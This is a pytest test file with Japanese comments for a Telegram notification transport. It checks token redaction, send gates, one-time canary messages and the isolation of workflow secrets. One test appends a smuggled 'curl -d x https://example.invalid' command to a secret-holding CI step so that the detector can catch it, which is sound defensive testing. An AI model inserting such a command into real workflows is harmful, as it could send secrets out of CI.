"""Phase 22（Telegram の送信の部品と接続の試験）のテスト。

ネットワークには出ない（偽の通信だけ。トークン・チャット ID はダミー）。各テストに否定の対照を付ける。
"""
from __future__ import annotations

import io
import json
import socket
import sys
import urllib.error
from datetime import timedelta
from pathlib import Path

import pytest

from _notify_helpers import NOW, _diag, ps5
from src.notifiers import adapters as ad
from src.notifiers import outbox as ob
from src.notifiers import telegram_transport as tt

ROOT = Path(__file__).resolve().parent.parent
TOKEN = "123456789:AAdummydummydummydummydummydummy00X"
CHAT = "-1009876543210"
FULL = {"NOTIFICATION_REAL_SEND": "true", "NOTIFICATION_DRY_RUN": "false", "NOTIFICATION_PROVIDERS": "telegram",
        "TELEGRAM_CANARY": "true", "GITHUB_EVENT_NAME": "workflow_dispatch",
        "TELEGRAM_BOT_TOKEN": TOKEN, "TELEGRAM_CHAT_ID": CHAT}


class Resp:
    def __init__(self, status, body, headers=None):
        self.status, self.body, self.headers = status, body, headers or {}

    def getcode(self):
        return self.status

    def read(self):
        return self.body


class Opener:
    def __init__(self, result):
        self.result, self.requests = result, []

    def open(self, req, timeout=None):
        self.requests.append(req)
        if isinstance(self.result, BaseException):
            raise self.result
        status, body = self.result[0], self.result[1]
        headers = self.result[2] if len(self.result) > 2 else {}
        if status >= 400:
            raise urllib.error.HTTPError(req.full_url, status, "err", headers, io.BytesIO(body))
        return Resp(status, body, headers)


def _adapter(result):
    op = Opener(result)
    return ad.TelegramAdapter(tt.make_telegram_transport(TOKEN, CHAT, opener=op)), op


CANARY = {"is_test_message": True, "message": ob.CANARY_TEXT}
OK = (200, json.dumps({"ok": True, "result": {"message_id": 4242}}).encode())


# ── 要求の形 ────────────────────────────────────────────────────────────────

def test_request_build():
    a, op = _adapter(OK)
    assert a.send(CANARY, "k") == "4242"
    req = op.requests[0]
    body = json.loads(req.data.decode("utf-8"))
    assert req.full_url == f"https://api.telegram.org/bot{TOKEN}/sendMessage" and req.get_method() == "POST"
    assert body == {"chat_id": CHAT, "text": ob.CANARY_TEXT, "disable_web_page_preview": True}   # parse_mode なし
    assert "[TEST]" in body["text"] and "接続テスト" in body["text"] and "http" not in body["text"]


def test_product_payload_unicode_and_url():
    st = ob.empty_store()
    ob.observe(st, _diag(ps5("OUT_OF_STOCK"))["actionability"]["products"], now=NOW, mode=ob.MODE_DRY)
    ob.observe(st, _diag(ps5())["actionability"]["products"], now=NOW, mode=ob.MODE_DRY)
    rec = next(iter(st["records"].values()))
    a, op = _adapter(OK)
    a.send(rec, "k")
    text = json.loads(op.requests[0].data.decode("utf-8"))["text"]
    assert "¥54,870" in text and "39.6%" in text and "商品: PlayStation 5 Pro" in text and rec["action_url"] in text
    assert len(text) <= 4096


def test_canary_text_is_short_and_not_product():
    assert len(ob.CANARY_TEXT) < 200 and "[TEST]" in ob.CANARY_TEXT and "本番の商品通知ではありません" in ob.CANARY_TEXT
    for w in ("¥", "PlayStation", "GR IV", "http"):
        assert w not in ob.CANARY_TEXT


# ── 応答の分類 ─────────────────────────────────────────────────────────────

@pytest.mark.parametrize("result,kind,cls", [
    ((200, b'{"ok": false, "error_code": 400, "description": "bad"}'), ad.FINAL, "malformed_payload"),
    ((200, b"<html>not json"), ad.AMBIGUOUS, "unexpected_body"),
    ((200, b'{"ok": true, "result": {}}'), ad.AMBIGUOUS, "missing_message_id"),
    ((400, b'{"ok": false, "error_code": 400}'), ad.FINAL, "malformed_payload"),
    ((401, b'{"ok": false, "error_code": 401}'), ad.FINAL, "auth"),
    ((403, b'{"ok": false, "error_code": 403}'), ad.FINAL, "auth"),
    ((429, b'{"ok": false, "error_code": 429, "parameters": {"retry_after": 30}}'), ad.RETRYABLE, "rate_limited"),
    ((500, b""), ad.AMBIGUOUS, "server_error"),
    ((502, b"bad gateway"), ad.AMBIGUOUS, "server_error"),
    ((503, b""), ad.RETRYABLE, "server_unavailable"),
    ((504, b""), ad.AMBIGUOUS, "server_error"),
    (socket.timeout("timed out"), ad.AMBIGUOUS, "response_lost"),
    (urllib.error.URLError(ConnectionResetError("reset")), ad.AMBIGUOUS, "response_lost"),
    (urllib.error.URLError(socket.gaierror("dns")), ad.RETRYABLE, "connect_failed"),
    (urllib.error.URLError(ConnectionRefusedError("refused")), ad.RETRYABLE, "connect_failed"),
])
def test_response_classification(result, kind, cls):
    a, _op = _adapter(result)
    with pytest.raises(ad.ProviderError) as e:
        a.send(CANARY, "k")
    assert (e.value.kind, e.value.error_class) == (kind, cls)
    assert TOKEN not in str(e.value) and CHAT not in str(e.value)


def test_429_retry_after_from_body_and_header():
    a, _op = _adapter((429, b'{"ok": false, "error_code": 429, "parameters": {"retry_after": 30}}'))
    with pytest.raises(ad.ProviderError) as e:
        a.send(CANARY, "k")
    assert e.value.retry_after == 30
    a, _op = _adapter((429, b"", {"Retry-After": "12"}))
    with pytest.raises(ad.ProviderError) as e:
        a.send(CANARY, "k")
    assert e.value.retry_after == 12


def test_exception_hides_token_url():
    """通信の例外の文字列（URL にトークン）を、記録・例外に出さない。"""
    class Leaky(Exception):
        def __str__(self):
            return f"failed https://api.telegram.org/bot{TOKEN}/sendMessage chat={CHAT}"
    a, _op = _adapter(Leaky())
    with pytest.raises(ad.ProviderError) as e:
        a.send(CANARY, "k")
    chain, x = [], e.value
    while x is not None:                                                     # 例外の連鎖をたどってもトークンが無い
        chain.append(repr(x) + str(x))
        x = x.__cause__ or x.__context__
    assert len(chain) == 1 and TOKEN not in "".join(chain) and CHAT not in "".join(chain)
    assert e.value.kind == ad.AMBIGUOUS


def test_redact_hides_token():
    assert TOKEN not in ad.redact(f"x https://api.telegram.org/bot{TOKEN}/sendMessage")
    assert TOKEN.split(":")[1] not in ad.redact(f"bot{TOKEN}")


# ── 関門 ───────────────────────────────────────────────────────────────────

def test_product_real_send_remains_disabled():
    assert ad.PRODUCT_REAL_SEND_ENABLED is False and not ad.real_send_gate(FULL, purpose="product")["allowed"]
    assert ad.real_send_gate(FULL, purpose="canary")["allowed"]                 # 否定の対照: 接続の試験は開く


@pytest.mark.parametrize("key,value", [("GITHUB_EVENT_NAME", "schedule"), ("TELEGRAM_CANARY", "false"),
                                       ("NOTIFICATION_REAL_SEND", "false"), ("NOTIFICATION_DRY_RUN", "true"),
                                       ("NOTIFICATION_PROVIDERS", "discord"), ("NOTIFICATION_PROVIDERS", "telegram,discord"),
                                       ("TELEGRAM_BOT_TOKEN", ""), ("TELEGRAM_CHAT_ID", ""),
                                       ("TELEGRAM_BOT_TOKEN", "not-a-token")])
def test_canary_gate_requires_everything(key, value):
    g = ad.real_send_gate(dict(FULL, **{key: value}), purpose="canary")
    assert not g["allowed"]
    assert TOKEN not in json.dumps(g) and CHAT not in json.dumps(g)


def test_gate_default_closed():
    assert not ad.real_send_gate({}, purpose="canary")["allowed"]
    assert not ad.real_send_gate({}, purpose="product")["allowed"]


# ── 接続の試験（canary） ────────────────────────────────────────────────────

def _store_dir(tmp_path):
    out = tmp_path / "out"
    ob.save(out / ob.STORE_NAME, ob.empty_store())
    return out


def _persist(out):
    return lambda: ob.file_sha(out / ob.STORE_NAME)


def test_canary_delivered_persistence(tmp_path, monkeypatch):
    monkeypatch.setenv("TELEGRAM_BOT_TOKEN", TOKEN)                         # 設定があっても台帳に入らない
    monkeypatch.setenv("TELEGRAM_CHAT_ID", CHAT)
    out = _store_dir(tmp_path)
    a, op = _adapter(OK)
    r = ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="telegram_canary_v1", adapter=a, persist=_persist(out))
    assert r["status"] == ob.DELIVERED and r["requests"] == 1 and len(op.requests) == 1
    st, _b = ob.load(out / ob.STORE_NAME)
    rec = ob.canary_record(st, "telegram_canary_v1")
    ch = rec["channels"]["telegram"]
    assert rec["is_canary"] and rec["is_test_message"] and ch["provider_delivery_id"] == "4242" and ch["delivered_at"]
    assert list(rec["channels"]) == ["telegram"]                              # Discord の記録を作らない
    text = ob.dumps(st)
    assert TOKEN not in text and CHAT not in text and "chat_id" not in text


def test_duplicate_canary_blocked(tmp_path):
    out = _store_dir(tmp_path)
    a, op = _adapter(OK)
    ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="c1", adapter=a, persist=_persist(out))
    for i in range(3):
        r = ob.run_canary(out, now=NOW + timedelta(hours=i + 1), attempt_id=f"b{i}", canary_id="c1", adapter=a,
                          persist=_persist(out))
        assert r["requests"] == 0 and r["reason"] == "already_delivered"
    assert len(op.requests) == 1
    r = ob.run_canary(out, now=NOW, attempt_id="c", canary_id="c2", adapter=a, persist=_persist(out))
    assert r["requests"] == 1                                                  # 否定の対照: 新しい ID なら送る


def test_canary_not_sent_before_persist(tmp_path):
    out = _store_dir(tmp_path)
    a, op = _adapter(OK)
    before = (out / ob.STORE_NAME).read_text(encoding="utf-8")
    for persist in (lambda: "", lambda: "0" * 64):
        r = ob.run_canary(out, now=NOW, attempt_id="a", canary_id="c1", adapter=a, persist=persist)
        assert r["requests"] == 0 and r["reason"] == "not_persisted_or_unknown"
    assert op.requests == [] and (out / ob.STORE_NAME).read_text(encoding="utf-8") == before


def test_canary_crash_after_success_not_resent(tmp_path):
    """送った後、DELIVERED を保存する前に止まった → 次の実行は届いたか不明にして送り直さない。"""
    out = _store_dir(tmp_path)
    persisted = {}

    def persist():
        persisted["text"] = (out / ob.STORE_NAME).read_text(encoding="utf-8")
        return ob.file_sha(out / ob.STORE_NAME)
    a, op = _adapter(OK)
    ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="c1", adapter=a, persist=persist)
    (out / ob.STORE_NAME).write_text(persisted["text"], encoding="utf-8")       # 送った後の保存が失われた
    st, _b = ob.load(out / ob.STORE_NAME)
    ob.prepare(st, [], now=NOW, mode=ob.MODE_DRY, attempt_id="a2")
    ob.save(out / ob.STORE_NAME, st)
    assert ob.canary_status(st, "c1") == ob.UNKNOWN_DELIVERY
    r = ob.run_canary(out, now=NOW, attempt_id="a3", canary_id="c1", adapter=a, persist=_persist(out))
    assert r["requests"] == 0 and len(op.requests) == 1
    assert any(u["notification_id"] == ob.canary_record(st, "c1")["notification_id"] for u in ob.list_unknown(st))


def test_canary_retry_after_429_same_record(tmp_path):
    out = _store_dir(tmp_path)
    a, op = _adapter((429, b'{"ok": false, "error_code": 429, "parameters": {"retry_after": 60}}'))
    r = ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="c1", adapter=a, persist=_persist(out))
    assert r["status"] == ob.FAILED_RETRYABLE
    r = ob.run_canary(out, now=NOW + timedelta(seconds=30), attempt_id="a2", canary_id="c1", adapter=a,
                      persist=_persist(out))
    assert r["requests"] == 0                                                  # Retry-After の前は送らない
    a2, op2 = _adapter(OK)
    r = ob.run_canary(out, now=NOW + timedelta(hours=1), attempt_id="a3", canary_id="c1", adapter=a2,
                      persist=_persist(out))
    assert r["status"] == ob.DELIVERED and len(op2.requests) == 1
    st, _b = ob.load(out / ob.STORE_NAME)
    assert len([r for r in st["records"].values() if r.get("is_canary")]) == 1


@pytest.mark.parametrize("result,status", [((401, b'{"ok": false, "error_code": 401}'), ob.FAILED_FINAL),
                                           ((502, b""), ob.UNKNOWN_DELIVERY)])
def test_canary_failure_not_retried(tmp_path, result, status):
    out = _store_dir(tmp_path)
    a, op = _adapter(result)
    r = ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="c1", adapter=a, persist=_persist(out))
    assert r["status"] == status
    r = ob.run_canary(out, now=NOW + timedelta(hours=7), attempt_id="a2", canary_id="c1", adapter=a,
                      persist=_persist(out))
    assert r["requests"] == 0 and len(op.requests) == 1


def test_canary_excluded_from_product_counts_and_prune(tmp_path):
    out = _store_dir(tmp_path)
    a, _op = _adapter(OK)
    ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="c1", adapter=a, persist=_persist(out))
    st, _b = ob.load(out / ob.STORE_NAME)
    assert ob.counts(st)["delivered"] == 0 and ob.counts(st)["records"] == 1
    assert ob.prune(st, NOW + timedelta(days=400)) == 0 and ob.canary_record(st, "c1")


def test_canary_unknown_resolution_needs_new_id(tmp_path):
    out = _store_dir(tmp_path)
    a, _op = _adapter((502, b""))
    ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="c1", adapter=a, persist=_persist(out))
    st, _b = ob.load(out / ob.STORE_NAME)
    nid = ob.canary_record(st, "c1")["notification_id"]
    ob.resolve(st, nid, ob.MARK_NOT_DELIVERED, rows=[], now=NOW)
    assert ob.canary_status(st, "c1") == ob.CANCELLED                         # 自動で出し直さない
    st2, _b = ob.load(out / ob.STORE_NAME)
    ob.resolve(st2, nid, ob.MARK_DELIVERED, rows=[], now=NOW)
    assert ob.canary_status(st2, "c1") == ob.DELIVERED


def test_provider_status_has_no_secrets(tmp_path):
    out = _store_dir(tmp_path)
    st, _b = ob.load(out / ob.STORE_NAME)
    assert ob.provider_status(st, configured=False, canary_gate=False, canary_id="c1")["telegram"]["status"] == \
        "NOT_CONFIGURED"
    assert ob.provider_status(st, configured=True, canary_gate=False, canary_id="c1")["telegram"]["status"] == "READY"
    assert ob.provider_status(st, configured=True, canary_gate=True, canary_id="c1")["telegram"]["status"] == \
        "CANARY_PENDING"
    a, _op = _adapter(OK)
    ob.run_canary(out, now=NOW, attempt_id="a1", canary_id="c1", adapter=a, persist=_persist(out))
    st, _b = ob.load(out / ob.STORE_NAME)
    ps = ob.provider_status(st, configured=True, canary_gate=False, canary_id="c1")
    assert ps["telegram"]["status"] == "CANARY_DELIVERED" and ps["telegram"]["product_real_send"] is False
    assert TOKEN not in json.dumps(ps) and CHAT not in json.dumps(ps)


# ── CLI（ネットワークと保存の手順は差し替え） ───────────────────────────────────

def _cli_env(tmp_path, monkeypatch, env):
    out = _store_dir(tmp_path)
    monkeypatch.setenv("ACTIONABLE_NOTIFICATIONS_DIR", str(out))
    dd = tmp_path / "diag"
    dd.mkdir()
    (dd / "latest.json").write_text("{}", encoding="utf-8")
    monkeypatch.setenv("OPPORTUNITY_DIAGNOSTICS_DIR", str(dd))
    for k in list(FULL):
        monkeypatch.delenv(k, raising=False)
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    return out


def test_cli_send_canary_once(tmp_path, monkeypatch):
    from click.testing import CliRunner
    from src import cli
    out = _cli_env(tmp_path, monkeypatch, FULL)
    op = Opener(OK)
    real = tt.make_telegram_transport
    monkeypatch.setattr(tt, "make_telegram_transport", lambda t, c: real(t, c, opener=op))

    class P:
        returncode = 0

        def __init__(self):
            self.stdout = f"sha={ob.file_sha(out / ob.STORE_NAME)}\n"
    monkeypatch.setattr("subprocess.run", lambda *a, **k: P())
    r = CliRunner().invoke(cli.cli, ["dispatch-notifications", "--step", "send", "--persisted-sha", "x"])
    assert r.exit_code == 0 and len(op.requests) == 1, r.output
    assert TOKEN not in r.output and CHAT not in r.output and '"canary": "sent"' in r.output
    r = CliRunner().invoke(cli.cli, ["dispatch-notifications", "--step", "send", "--persisted-sha", "x"])
    assert len(op.requests) == 1 and "already_delivered" in r.output           # 次の実行は送らない
    ps = json.loads((out / "provider_status.json").read_text(encoding="utf-8"))
    assert ps["telegram"]["status"] == "CANARY_DELIVERED" and TOKEN not in json.dumps(ps)


def test_cli_send_without_gate_sends_nothing(tmp_path, monkeypatch):
    from click.testing import CliRunner
    from src import cli
    out = _cli_env(tmp_path, monkeypatch, dict(FULL, GITHUB_EVENT_NAME="schedule"))

    def boom(*a, **k):
        raise AssertionError("transport created")
    monkeypatch.setattr(tt, "make_telegram_transport", boom)
    r = CliRunner().invoke(cli.cli, ["dispatch-notifications", "--step", "send", "--persisted-sha", "x"])
    assert r.exit_code == 0 and '"canary": "disabled"' in r.output
    ps = json.loads((out / "provider_status.json").read_text(encoding="utf-8"))
    assert ps["telegram"]["status"] == "READY" and ps["telegram"]["configured"] is True


def test_product_notifications_not_sent_in_canary_run(tmp_path, monkeypatch):
    """接続の試験の実行でも、商品の通知は dry-run のまま（送らない）。"""
    from click.testing import CliRunner
    from src import cli
    d = dict(_diag(ps5()), generated_at=NOW.isoformat())
    out = _cli_env(tmp_path, monkeypatch, FULL)
    ob.run_observe(out, dict(_diag(ps5("OUT_OF_STOCK")), generated_at="x"), now=NOW, dry_run=True)
    ob.run_observe(out, d, now=NOW, dry_run=True)
    (tmp_path / "diag" / "latest.json").write_text(json.dumps(d), encoding="utf-8")
    r = CliRunner().invoke(cli.cli, ["dispatch-notifications", "--step", "prepare"])
    assert '"dry_run": true' in r.output
    st, _b = ob.load(out / ob.STORE_NAME)
    assert all(r["mode"] == ob.MODE_DRY for r in st["records"].values() if not r.get("is_canary"))


# ── ワークフロー ────────────────────────────────────────────────────────────

def _dc():
    sys.path.insert(0, str(ROOT / "scripts"))
    import deploy_check
    return deploy_check


def test_secret_isolation_in_workflow():
    import re
    import yaml
    wf = (ROOT / ".github" / "workflows" / "daily_lp.yml").read_text(encoding="utf-8")
    doc = yaml.safe_load(wf)
    holders = {}
    for st in doc["jobs"]["update-lp"]["steps"]:
        names = set(re.findall(r"secrets\.(TELEGRAM_\w+|DISCORD_\w+)", str(st.get("env") or ""), re.I))
        if names:
            holders[st["name"]] = names
    assert holders == {"Send notifications": {"TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_ID"},
                       "Notify workflow result": {"DISCORD_WEBHOOK_URL"}}
    assert _dc()._notification_secret_exposure(ROOT) == []


@pytest.mark.parametrize("mutate", [
    lambda t: t.replace("      - name: Generate daily LP Variant A\n        id: generate_lp\n",
                        "      - name: Generate daily LP Variant A\n        id: generate_lp\n", 1).replace(
        "          NOTIFICATION_OUTBOX_SYNCED:", "          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}\n"
                                               "          NOTIFICATION_OUTBOX_SYNCED:", 1),
    lambda t: t.replace("          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}\n",
                        "          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}\n"
                        "          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}\n", 1),
    lambda t: t.replace("          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}\n",
                        "          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}\n"
                        "          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}\n", 1),
])
def test_secret_in_wrong_step_detected(tmp_path, mutate):
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    src = (ROOT / ".github" / "workflows" / "daily_lp.yml").read_text(encoding="utf-8")
    m = mutate(src)
    assert m != src
    (tmp_path / ".github" / "workflows" / "daily_lp.yml").write_text(m, encoding="utf-8")
    assert _dc()._notification_secret_exposure(tmp_path)


def test_canary_flag_only_on_manual_dispatch():
    wf = (ROOT / ".github" / "workflows" / "daily_lp.yml").read_text(encoding="utf-8")
    assert "TELEGRAM_CANARY: ${{ github.event_name == 'workflow_dispatch' && vars.TELEGRAM_CANARY || 'false' }}" in wf
    assert "NOTIFICATION_REAL_SEND: ${{ vars.NOTIFICATION_REAL_SEND || 'false' }}" in wf
    assert "NOTIFICATION_DRY_RUN: ${{ vars.NOTIFICATION_DRY_RUN || 'true' }}" in wf


def test_transport_has_no_logging():
    import re
    src = (ROOT / "src" / "notifiers" / "telegram_transport.py").read_text(encoding="utf-8")
    assert not re.search(r"\bprint\(|logger\.|logging\.", src)
    assert tt.API_BASE == "https://api.telegram.org"


def test_deploy_check_858_ok():
    assert _dc()._check_phase22_telegram_safety()[0]["level"] == "ok"
    assert _dc()._check_phase21_delivery_providers()[0]["level"] == "ok"


# ── 監査の指摘（H-1・M-1・L-1〜L-3） ─────────────────────────────────────

def test_deploy_check_856_allows_canary_record(tmp_path, monkeypatch):
    """接続の試験の記録（live）が台帳にあっても #856 は止めない。商品の live の記録はエラー（H-1）。"""
    dc = _dc()
    root = ROOT
    st, _b = ob.load(root / "exports" / "notifications" / "actionable" / "state.json")
    rec = ob._new_canary("telegram_canary_v1", NOW)
    rec["status"] = ob.DELIVERED
    st["records"][rec["notification_id"]] = rec
    real = Path.read_text
    target = (root / "exports" / "notifications" / "actionable" / "state.json").resolve()

    def fake(self, *a, **k):
        return ob.dumps(st) if self.resolve() == target else real(self, *a, **k)
    monkeypatch.setattr(Path, "read_text", fake)
    assert dc._check_phase20_notification_outbox()[0]["level"] in ("ok", "warning")
    prod = dict(rec, is_canary=False, notification_type="ACTIONABLE_NOW", product_id="p", notification_id="zz")
    st["records"]["zz"] = prod
    assert dc._check_phase20_notification_outbox()[0]["level"] == "error"


def test_canary_send_only_its_own_record(tmp_path):
    """同じ attempt の SENDING の商品の記録があっても、接続の試験の実行では送らない（M-1）。"""
    out = _store_dir(tmp_path)
    st, _b = ob.load(out / ob.STORE_NAME)
    ob.observe(st, _diag(ps5("OUT_OF_STOCK"))["actionability"]["products"], now=NOW, mode=ob.MODE_LIVE)
    ob.observe(st, _diag(ps5())["actionability"]["products"], now=NOW, mode=ob.MODE_LIVE, channels=["telegram"])
    prod = next(iter(st["records"].values()))
    prod["channels"]["telegram"].update(status=ob.SENDING, attempt_id="A",
                                        attempts=[{"attempt_id": "A", "status": ob.SENDING}])
    ob.save(out / ob.STORE_NAME, st)
    a, op = _adapter(OK)
    r = ob.run_canary(out, now=NOW, attempt_id="A", canary_id="c1", adapter=a, persist=_persist(out))
    assert len(op.requests) == 1 and r["requests"] == 1
    assert "[TEST]" in json.loads(op.requests[0].data.decode("utf-8"))["text"]


@pytest.mark.parametrize("cid", ["-1001234567890:x", "a" * 41, "has space", "../x", "", "-1009876543210",
                                 "1009876543210", "@mychannel", "Telegram_V1"])
def test_invalid_canary_id_not_used(tmp_path, cid):
    out = _store_dir(tmp_path)
    a, op = _adapter(OK)
    r = ob.run_canary(out, now=NOW, attempt_id="a", canary_id=cid, adapter=a, persist=_persist(out))
    assert r["requests"] == 0 and op.requests == []
    assert ob.valid_canary_id("telegram_canary_v2")                            # 否定の対照


def test_persist_rejects_raw_secret_values(tmp_path):
    """送信の手順の中で、台帳に設定の値そのもの（チャット ID など）があれば保存しない（L-3）。"""
    import os
    import subprocess
    state = tmp_path / "exports" / "notifications" / "actionable" / "state.json"
    state.parent.mkdir(parents=True)
    state.write_text('{"x": "-1009876543210"}', encoding="utf-8")
    env = {**os.environ, "TELEGRAM_CHAT_ID": CHAT}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "persist_notification_state.sh")], cwd=tmp_path,
                       capture_output=True, env=env, encoding="utf-8", errors="replace")
    assert r.returncode == 1 and "設定の値" in r.stdout and CHAT not in r.stdout


def test_send_step_command_exact(tmp_path):
    """Secrets を持つ送信の手順の run は完全一致（後ろに命令を足すと検出。L-1）。"""
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    src = (ROOT / ".github" / "workflows" / "daily_lp.yml").read_text(encoding="utf-8")
    bad = src.replace('--step send --persisted-sha "${{ steps.persist_outbox_prepared.outputs.sha }}"',
                      '--step send --persisted-sha "${{ steps.persist_outbox_prepared.outputs.sha }}"; curl -d x '
                      'https://example.invalid', 1)
    assert bad != src
    (tmp_path / ".github" / "workflows" / "daily_lp.yml").write_text(bad, encoding="utf-8")
    assert any("決まったコマンド" in p for p in _dc()._notification_secret_exposure(tmp_path))


def test_856_does_not_exclude_fake_canary(monkeypatch):
    """接続の試験に見せかけた記録（商品の文・URL・Discord）は除外しない（#856 はエラー）。"""
    dc = _dc()
    st, _b = ob.load(ROOT / "exports" / "notifications" / "actionable" / "state.json")
    fake_rec = ob._new_canary("x", NOW)
    fake_rec.update(message="🎯 購入可能になりました", action_url="https://pur.store.sony.jp/x")
    st["records"]["fake"] = fake_rec
    real = Path.read_text
    target = (ROOT / "exports" / "notifications" / "actionable" / "state.json").resolve()
    monkeypatch.setattr(Path, "read_text", lambda self, *a, **k: ob.dumps(st) if self.resolve() == target
                        else real(self, *a, **k))
    assert dc._check_phase20_notification_outbox()[0]["level"] == "error"


def test_canary_id_containing_chat_id_rejected(monkeypatch):
    monkeypatch.setenv("TELEGRAM_CHAT_ID", "9876543210")
    assert not ob.valid_canary_id("c_9876543210")
    assert ob.valid_canary_id("telegram_canary_v2")


def test_cli_does_not_write_bad_canary_id(tmp_path, monkeypatch):
    from click.testing import CliRunner
    from src import cli
    out = _cli_env(tmp_path, monkeypatch, dict(FULL, TELEGRAM_CANARY_ID=CHAT))
    monkeypatch.setattr(tt, "make_telegram_transport", lambda *a, **k: (_ for _ in ()).throw(AssertionError("x")))
    r = CliRunner().invoke(cli.cli, ["dispatch-notifications", "--step", "send", "--persisted-sha", "x"])
    assert r.exit_code == 0 and CHAT not in r.output
    assert CHAT not in (out / "provider_status.json").read_text(encoding="utf-8")


def test_persist_chat_id_exact_match_only(tmp_path):
    """チャット ID は JSON の文字列の値としての完全一致だけ（ほかの数字に部分一致して止めない。L-B）。"""
    import os
    import subprocess
    state = tmp_path / "exports" / "notifications" / "actionable" / "state.json"
    state.parent.mkdir(parents=True)
    state.write_text('{"until_ms": 1760000000000}', encoding="utf-8")
    env = {**os.environ, "TELEGRAM_CHAT_ID": "600000000", "GITHUB_OUTPUT": str(tmp_path / "o")}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "persist_notification_state.sh")], cwd=tmp_path,
                       capture_output=True, env=env, encoding="utf-8", errors="replace")
    assert "設定の値" not in r.stdout                                       # 部分一致では止めない


def test_admin_does_not_show_canary_id():
    from src.content.ui import admin
    rep = {"generated_at": NOW.isoformat(), "dry_run": True, "counts": {},
           "provider_status": {"telegram": {"configured": True, "status": "READY", "canary_id": "secretish_id",
                                            "canary_status": "NONE"}}}
    html = admin._act_notices(admin.build_actionable_notices(rep))
    assert "secretish_id" not in html and "READY" in html and "Telegram の設定" in html


def test_856_canary_by_shape_not_exact_text(monkeypatch):
    """接続の試験の文言を変えても、過去の記録で #856 を止めない（形で見る。L-5）。"""
    dc = _dc()
    st, _b = ob.load(ROOT / "exports" / "notifications" / "actionable" / "state.json")
    rec = ob._new_canary("old_v0", NOW)
    rec.update(status=ob.DELIVERED, message="[TEST] 古い文言の接続テスト")
    st["records"][rec["notification_id"]] = rec
    real = Path.read_text
    target = (ROOT / "exports" / "notifications" / "actionable" / "state.json").resolve()
    monkeypatch.setattr(Path, "read_text", lambda self, *a, **k: ob.dumps(st) if self.resolve() == target
                        else real(self, *a, **k))
    assert dc._check_phase20_notification_outbox()[0]["level"] in ("ok", "warning")


def test_requests_count_only_real_calls(tmp_path):
    """本文の検査で弾かれた（通信していない）ものは requests に数えない（L-6）。"""
    out = _store_dir(tmp_path)
    a, op = _adapter(OK)
    a.build_payload = lambda record: {"text": ""}                              # 空の本文 → 送る前に止まる
    r = ob.run_canary(out, now=NOW, attempt_id="a", canary_id="c1", adapter=a, persist=_persist(out))
    assert r["requests"] == 0 and op.requests == [] and r["status"] == ob.FAILED_FINAL
